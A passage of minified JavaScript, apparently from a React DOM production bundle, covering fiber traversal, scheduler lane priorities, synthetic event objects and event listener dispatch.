m0=ie({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Ou(t,e){if(e){if(m0[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(C(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(C(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(C(61))}if(e.style!=null&&typeof e.style!="object")throw Error(C(62))}}function bu(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Lu=null;function Jc(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Du=null,Br=null,Hr=null;function tf(t){if(t=Hs(t)){if(typeof Du!="function")throw Error(C(280));var e=t.stateNode;e&&(e=Xl(e),Du(t.stateNode,t.type,e))}}function Zm(t){Br?Hr?Hr.push(t):Hr=[t]:Br=t}function eg(){if(Br){var t=Br,e=Hr;if(Hr=Br=null,tf(t),e)for(t=0;t<e.length;t++)tf(e[t])}}function tg(t,e){return t(e)}function ng(){}var Oa=!1;function rg(t,e,n){if(Oa)return t(e,n);Oa=!0;try{return tg(t,e,n)}finally{Oa=!1,(Br!==null||Hr!==null)&&(ng(),eg())}}function us(t,e){var n=t.stateNode;if(n===null)return null;var r=Xl(n);if(r===null)return null;n=r[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(t=t.type,r=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!r;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error(C(231,e,typeof n));return n}var Mu=!1;if(Bt)try{var ki={};Object.defineProperty(ki,"passive",{get:function(){Mu=!0}}),window.addEventListener("test",ki,ki),window.removeEventListener("test",ki,ki)}catch{Mu=!1}function g0(t,e,n,r,i,s,o,l,a){var u=Array.prototype.slice.call(arguments,3);try{e.apply(n,u)}catch(c){this.onError(c)}}var Gi=!1,Go=null,Ko=!1,Uu=null,_0={onError:function(t){Gi=!0,Go=t}};function v0(t,e,n,r,i,s,o,l,a){Gi=!1,Go=null,g0.apply(_0,arguments)}function y0(t,e,n,r,i,s,o,l,a){if(v0.apply(this,arguments),Gi){if(Gi){var u=Go;Gi=!1,Go=null}else throw Error(C(198));Ko||(Ko=!0,Uu=u)}}function pr(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function ig(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function nf(t){if(pr(t)!==t)throw Error(C(188))}function w0(t){var e=t.alternate;if(!e){if(e=pr(t),e===null)throw Error(C(188));return e!==t?null:t}for(var n=t,r=e;;){var i=n.return;if(i===null)break;var s=i.alternate;if(s===null){if(r=i.return,r!==null){n=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===n)return nf(i),t;if(s===r)return nf(i),e;s=s.sibling}throw Error(C(188))}if(n.return!==r.return)n=i,r=s;else{for(var o=!1,l=i.child;l;){if(l===n){o=!0,n=i,r=s;break}if(l===r){o=!0,r=i,n=s;break}l=l.sibling}if(!o){for(l=s.child;l;){if(l===n){o=!0,n=s,r=i;break}if(l===r){o=!0,r=s,n=i;break}l=l.sibling}if(!o)throw Error(C(189))}}if(n.alternate!==r)throw Error(C(190))}if(n.tag!==3)throw Error(C(188));return n.stateNode.current===n?t:e}function sg(t){return t=w0(t),t!==null?og(t):null}function og(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=og(t);if(e!==null)return e;t=t.sibling}return null}var lg=Je.unstable_scheduleCallback,rf=Je.unstable_cancelCallback,E0=Je.unstable_shouldYield,C0=Je.unstable_requestPaint,ue=Je.unstable_now,S0=Je.unstable_getCurrentPriorityLevel,Zc=Je.unstable_ImmediatePriority,ag=Je.unstable_UserBlockingPriority,Yo=Je.unstable_NormalPriority,T0=Je.unstable_LowPriority,ug=Je.unstable_IdlePriority,Gl=null,It=null;function I0(t){if(It&&typeof It.onCommitFiberRoot=="function")try{It.onCommitFiberRoot(Gl,t,void 0,(t.current.flags&128)===128)}catch{}}var gt=Math.clz32?Math.clz32:N0,k0=Math.log,R0=Math.LN2;function N0(t){return t>>>=0,t===0?32:31-(k0(t)/R0|0)|0}var co=64,ho=4194304;function Hi(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function Qo(t,e){var n=t.pendingLanes;if(n===0)return 0;var r=0,i=t.suspendedLanes,s=t.pingedLanes,o=n&268435455;if(o!==0){var l=o&~i;l!==0?r=Hi(l):(s&=o,s!==0&&(r=Hi(s)))}else o=n&~i,o!==0?r=Hi(o):s!==0&&(r=Hi(s));if(r===0)return 0;if(e!==0&&e!==r&&!(e&i)&&(i=r&-r,s=e&-e,i>=s||i===16&&(s&4194240)!==0))return e;if(r&4&&(r|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=r;0<e;)n=31-gt(e),i=1<<n,r|=t[n],e&=~i;return r}function P0(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function x0(t,e){for(var n=t.suspendedLanes,r=t.pingedLanes,i=t.expirationTimes,s=t.pendingLanes;0<s;){var o=31-gt(s),l=1<<o,a=i[o];a===-1?(!(l&n)||l&r)&&(i[o]=P0(l,e)):a<=e&&(t.expiredLanes|=l),s&=~l}}function Fu(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function cg(){var t=co;return co<<=1,!(co&4194240)&&(co=64),t}function ba(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function zs(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-gt(e),t[e]=n}function A0(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var r=t.eventTimes;for(t=t.expirationTimes;0<n;){var i=31-gt(n),s=1<<i;e[i]=0,r[i]=-1,t[i]=-1,n&=~s}}function ed(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var r=31-gt(n),i=1<<r;i&e|t[r]&e&&(t[r]|=e),n&=~i}}var $=0;function dg(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var hg,td,fg,pg,mg,ju=!1,fo=[],fn=null,pn=null,mn=null,cs=new Map,ds=new Map,nn=[],O0="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function sf(t,e){switch(t){case"focusin":case"focusout":fn=null;break;case"dragenter":case"dragleave":pn=null;break;case"mouseover":case"mouseout":mn=null;break;case"pointerover":case"pointerout":cs.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":ds.delete(e.pointerId)}}function Ri(t,e,n,r,i,s){return t===null||t.nativeEvent!==s?(t={blockedOn:e,domEventName:n,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},e!==null&&(e=Hs(e),e!==null&&td(e)),t):(t.eventSystemFlags|=r,e=t.targetContainers,i!==null&&e.indexOf(i)===-1&&e.push(i),t)}function b0(t,e,n,r,i){switch(e){case"focusin":return fn=Ri(fn,t,e,n,r,i),!0;case"dragenter":return pn=Ri(pn,t,e,n,r,i),!0;case"mouseover":return mn=Ri(mn,t,e,n,r,i),!0;case"pointerover":var s=i.pointerId;return cs.set(s,Ri(cs.get(s)||null,t,e,n,r,i)),!0;case"gotpointercapture":return s=i.pointerId,ds.set(s,Ri(ds.get(s)||null,t,e,n,r,i)),!0}return!1}function gg(t){var e=Bn(t.target);if(e!==null){var n=pr(e);if(n!==null){if(e=n.tag,e===13){if(e=ig(n),e!==null){t.blockedOn=e,mg(t.priority,function(){fg(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Ao(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=zu(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var r=new n.constructor(n.type,n);Lu=r,n.target.dispatchEvent(r),Lu=null}else return e=Hs(n),e!==null&&td(e),t.blockedOn=n,!1;e.shift()}return!0}function of(t,e,n){Ao(t)&&n.delete(e)}function L0(){ju=!1,fn!==null&&Ao(fn)&&(fn=null),pn!==null&&Ao(pn)&&(pn=null),mn!==null&&Ao(mn)&&(mn=null),cs.forEach(of),ds.forEach(of)}function Ni(t,e){t.blockedOn===e&&(t.blockedOn=null,ju||(ju=!0,Je.unstable_scheduleCallback(Je.unstable_NormalPriority,L0)))}function hs(t){function e(i){return Ni(i,t)}if(0<fo.length){Ni(fo[0],t);for(var n=1;n<fo.length;n++){var r=fo[n];r.blockedOn===t&&(r.blockedOn=null)}}for(fn!==null&&Ni(fn,t),pn!==null&&Ni(pn,t),mn!==null&&Ni(mn,t),cs.forEach(e),ds.forEach(e),n=0;n<nn.length;n++)r=nn[n],r.blockedOn===t&&(r.blockedOn=null);for(;0<nn.length&&(n=nn[0],n.blockedOn===null);)gg(n),n.blockedOn===null&&nn.shift()}var Wr=Kt.ReactCurrentBatchConfig,Xo=!0;function D0(t,e,n,r){var i=$,s=Wr.transition;Wr.transition=null;try{$=1,nd(t,e,n,r)}finally{$=i,Wr.transition=s}}function M0(t,e,n,r){var i=$,s=Wr.transition;Wr.transition=null;try{$=4,nd(t,e,n,r)}finally{$=i,Wr.transition=s}}function nd(t,e,n,r){if(Xo){var i=zu(t,e,n,r);if(i===null)Wa(t,e,r,Jo,n),sf(t,r);else if(b0(i,t,e,n,r))r.stopPropagation();else if(sf(t,r),e&4&&-1<O0.indexOf(t)){for(;i!==null;){var s=Hs(i);if(s!==null&&hg(s),s=zu(t,e,n,r),s===null&&Wa(t,e,r,Jo,n),s===i)break;i=s}i!==null&&r.stopPropagation()}else Wa(t,e,r,null,n)}}var Jo=null;function zu(t,e,n,r){if(Jo=null,t=Jc(r),t=Bn(t),t!==null)if(e=pr(t),e===null)t=null;else if(n=e.tag,n===13){if(t=ig(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return Jo=t,null}function _g(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(S0()){case Zc:return 1;case ag:return 4;case Yo:case T0:return 16;case ug:return 536870912;default:return 16}default:return 16}}var cn=null,rd=null,Oo=null;function vg(){if(Oo)return Oo;var t,e=rd,n=e.length,r,i="value"in cn?cn.value:cn.textContent,s=i.length;for(t=0;t<n&&e[t]===i[t];t++);var o=n-t;for(r=1;r<=o&&e[n-r]===i[s-r];r++);return Oo=i.slice(t,1<r?1-r:void 0)}function bo(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function po(){return!0}function lf(){return!1}function et(t){function e(n,r,i,s,o){this._reactName=n,this._targetInst=i,this.type=r,this.nativeEvent=s,this.target=o,this.currentTarget=null;for(var l in t)t.hasOwnProperty(l)&&(n=t[l],this[l]=n?n(s):s[l]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?po:lf,this.isPropagationStopped=lf,this}return ie(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=po)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=po)},persist:function(){},isPersistent:po}),e}var fi={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},id=et(fi),Bs=ie({},fi,{view:0,detail:0}),U0=et(Bs),La,Da,Pi,Kl=ie({},Bs,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:sd,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==Pi&&(Pi&&t.type==="mousemove"?(La=t.screenX-Pi.screenX,Da=t.screenY-Pi.screenY):Da=La=0,Pi=t),La)},movementY:function(t){return"movementY"in t?t.movementY:Da}}),af=et(Kl),F0=ie({},Kl,{dataTransfer:0}),j0=et(F0),z0=ie({},Bs,{relatedTarget:0}),Ma=et(z0),B0=ie({},fi,{animationName:0,elapsedTime:0,pseudoElement:0}),H0=et(B0),W0=ie({},fi,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),$0=et(W0),V0=ie({},fi,{data:0}),uf=et(V0),q0={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},G0={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},K0={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Y0(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=K0[t])?!!e[t]:!1}function sd(){return Y0}var Q0=ie({},Bs,{key:function(t){if(t.key){var e=q0[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=bo(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?G0[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:sd,charCode:function(t){return t.type==="keypress"?bo(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?bo(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),X0=et(Q0),J0=ie({},Kl,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),cf=et(J0),Z0=ie({},Bs,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:sd}),eE=et(Z0),tE=ie({},fi,{propertyName:0,elapsedTime:0,pseudoElement:0}),nE=et(tE),rE=ie({},Kl,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),iE=et(rE),sE=[9,13,27,32],od=Bt&&"CompositionEvent"in window,Ki=null;Bt&&"documentMode"in document&&(Ki=document.documentMode);var oE=Bt&&"TextEvent"in window&&!Ki,yg=Bt&&(!od||Ki&&8<Ki&&11>=Ki),df=String.fromCharCode(32),hf=!1;function wg(t,e){switch(t){case"keyup":return sE.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Eg(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var Nr=!1;function lE(t,e){switch(t){case"compositionend":return Eg(e);case"keypress":return e.which!==32?null:(hf=!0,df);case"textInput":return t=e.data,t===df&&hf?null:t;default:return null}}function aE(t,e){if(Nr)return t==="compositionend"||!od&&wg(t,e)?(t=vg(),Oo=rd=cn=null,Nr=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return yg&&e.locale!=="ko"?null:e.data;default:return null}}var uE={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function ff(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!uE[t.type]:e==="textarea"}function Cg(t,e,n,r){Zm(r),e=Zo(e,"onChange"),0<e.length&&(n=new id("onChange","change",null,n,r),t.push({event:n,listeners:e}))}var Yi=null,fs=null;function cE(t){bg(t,0)}function Yl(t){var e=Ar(t);if(qm(e))return t}function dE(t,e){if(t==="change")return e}var Sg=!1;if(Bt){var Ua;if(Bt){var Fa="oninput"in document;if(!Fa){var pf=document.createElement("div");pf.setAttribute("oninput","return;"),Fa=typeof pf.oninput=="function"}Ua=Fa}else Ua=!1;Sg=Ua&&(!document.documentMode||9<document.documentMode)}function mf(){Yi&&(Yi.detachEvent("onpropertychange",Tg),fs=Yi=null)}function Tg(t){if(t.propertyName==="value"&&Yl(fs)){var e=[];Cg(e,fs,t,Jc(t)),rg(cE,e)}}function hE(t,e,n){t==="focusin"?(mf(),Yi=e,fs=n,Yi.attachEvent("onpropertychange",Tg)):t==="focusout"&&mf()}function fE(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return Yl(fs)}function pE(t,e){if(t==="click")return Yl(e)}function mE(t,e){if(t==="input"||t==="change")return Yl(e)}function gE(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var yt=typeof Object.is=="function"?Object.is:gE;function ps(t,e){if(yt(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),r=Object.keys(e);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var i=n[r];if(!Cu.call(e,i)||!yt(t[i],e[i]))return!1}return!0}function gf(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function _f(t,e){var n=gf(t);t=0;for(var r;n;){if(n.nodeType===3){if(r=t+n.textContent.length,t<=e&&r>=e)return{node:n,offset:e-t};t=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=gf(n)}}function Ig(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?Ig(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function kg(){for(var t=window,e=qo();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=qo(t.document)}return e}function ld(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function _E(t){var e=kg(),n=t.focusedElem,r=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&Ig(n.ownerDocument.documentElement,n)){if(r!==null&&ld(n)){if(e=r.start,t=r.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var i=n.textContent.length,s=Math.min(r.start,i);r=r.end===void 0?s:Math.min(r.end,i),!t.extend&&s>r&&(i=r,r=s,s=i),i=_f(n,s);var o=_f(n,r);i&&o&&(t.rangeCount!==1||t.anchorNode!==i.node||t.anchorOffset!==i.offset||t.focusNode!==o.node||t.focusOffset!==o.offset)&&(e=e.createRange(),e.setStart(i.node,i.offset),t.removeAllRanges(),s>r?(t.addRange(e),t.extend(o.node,o.offset)):(e.setEnd(o.node,o.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var vE=Bt&&"documentMode"in document&&11>=document.documentMode,Pr=null,Bu=null,Qi=null,Hu=!1;function vf(t,e,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;Hu||Pr==null||Pr!==qo(r)||(r=Pr,"selectionStart"in r&&ld(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),Qi&&ps(Qi,r)||(Qi=r,r=Zo(Bu,"onSelect"),0<r.length&&(e=new id("onSelect","select",null,e,n),t.push({event:e,listeners:r}),e.target=Pr)))}function mo(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var xr={animationend:mo("Animation","AnimationEnd"),animationiteration:mo("Animation","AnimationIteration"),animationstart:mo("Animation","AnimationStart"),transitionend:mo("Transition","TransitionEnd")},ja={},Rg={};Bt&&(Rg=document.createElement("div").style,"AnimationEvent"in window||(delete xr.animationend.animation,delete xr.animationiteration.animation,delete xr.animationstart.animation),"TransitionEvent"in window||delete xr.transitionend.transition);function Ql(t){if(ja[t])return ja[t];if(!xr[t])return t;var e=xr[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in Rg)return ja[t]=e[n];return t}var Ng=Ql("animationend"),Pg=Ql("animationiteration"),xg=Ql("animationstart"),Ag=Ql("transitionend"),Og=new Map,yf="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function xn(t,e){Og.set(t,e),fr(e,[t])}for(var za=0;za<yf.length;za++){var Ba=yf[za],yE=Ba.toLowerCase(),wE=Ba[0].toUpperCase()+Ba.slice(1);xn(yE,"on"+wE)}xn(Ng,"onAnimationEnd");xn(Pg,"onAnimationIteration");xn(xg,"onAnimationStart");xn("dblclick","onDoubleClick");xn("focusin","onFocus");xn("focusout","onBlur");xn(Ag,"onTransitionEnd");Zr("onMouseEnter",["mouseout","mouseover"]);Zr("onMouseLeave",["mouseout","mouseover"]);Zr("onPointerEnter",["pointerout","pointerover"]);Zr("onPointerLeave",["pointerout","pointerover"]);fr("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));fr("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));fr("onBeforeInput",["compositionend","keypress","textInput","paste"]);fr("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));fr("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));fr("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Wi="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),EE=new Set("cancel close invalid load scroll toggle".split(" ").concat(Wi));function wf(t,e,n){var r=t.type||"unknown-event";t.currentTarget=n,y0(r,e,void 0,t),t.currentTarget=null}function bg(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var r=t[n],i=r.event;r=r.listeners;e:{var s=void 0;if(e)for(var o=r.length-1;0<=o;o--){var l=r[o],a=l.instance,u=l.currentTarget;if(l=l.listener,a!==s&&i.isPropagationStopped())break e;wf(i,l,u),s=a}else for(o=0;o<r.length;o++){if(l=r[o],a=l.instance,u=l.currentTarget,l=l.listener,a!==s&&i.isPropagationStopped())break e;wf(i,l,u),s=a}}}if(Ko)throw t=Uu,Ko=!1,Uu=null,t}function Y(t,e){var n=e[Gu];n===void 0&&(n=e[Gu]=new Set);var r=t+"__bubble";n.has(r)||(Lg(e,t,2,!1),n.add(r))}function Ha(t,e,n){var r=0;e&&(r|=4),Lg(n,t,r,e)}var go="_reactListening"+Math.random().toString(36).slice(2);function ms(t){if(!t[go]){t[go]=!0,Bm.forEach(function(n){n!=="selectionchange"&&(EE.has(n)||Ha(n,!1,t),Ha(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[go]||(e[go]=!0,Ha("selectionchange",!1,e))}}function Lg(t,e,n,r){switch(_g(e)){case 1:var i=D0;break;case 4:i=M0;break;default:i=nd}n=i.bind(null,e,n,t),i=void 0,!Mu||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(i=!0),r?i!==void 0?t.addEventListener(e,n,{capture:!0,passive:i}):t.addEventListener(e,n,!0):i!==void 0?t.addEventListener(e,n,{passive:i}):t.addEventListener(e,n,!1)}function Wa(t,e,n,r,i){var s=r;if(!(e&1)&&!(e&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var l=r.stateNode.containerInfo;if(l===i||l.nodeType===8&&l.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var a=o.tag;if((a===3||a===4)&&(a=o.stateNode.containerInfo,a===i||a.nodeType===8&&a.parentNode===i))return;o=o.return}for(;l!==null;){if(o=Bn(l),o===null)return;if(a=o.tag,a===5||a===6){r=s=o;continue e}l=l.parentNode}}r=r.return}rg(function(){var u=s,c=Jc(n),d=[];e:{var h=Og.get(t);if(h!==void 0){var m=id,_=t;switch(t){case"keypress":if(bo(n)===0)break e;case"keydown":case"keyup":m=X0;break;case"focusin":_="focus",m=Ma;break;case"focusout":_="blur",m=Ma;break;case"beforeblur":case"afterblur":m=Ma;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":m=af;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":m=j0;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":m=eE;break;case Ng:case Pg:case xg:m=H0;break;case Ag:m=nE;break;case"scroll":m=U0;break;case"wheel":m=iE;break;case"copy":case"cut":case"paste":m=$0;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":m=cf}var v=(e&4)!==0,w=!v&&t==="scroll",p=v?h!==null?h+"Capture":null:h;v=[];for(var f=u,g;f!==null;){g=f;var y=g.stateNode;if(g.tag===5&&y!==null&&(g=y,p!==null&&(y=us(f,p),y!=null&&v.push(gs(f,y,g)))),w)break;f=f.return}0<v.length&&(h=new m(h,_,null,n,c),d.push({event:h,listeners:v}))}}if(!(e&7)){e:{if(h=t==="mouseover"||t==="pointerover",m=t==="mouseout"||t==="pointerout",h&&n!==Lu&&(_=n.relatedTarget||n.fromElement)&&(Bn(_)||_[Ht]))break 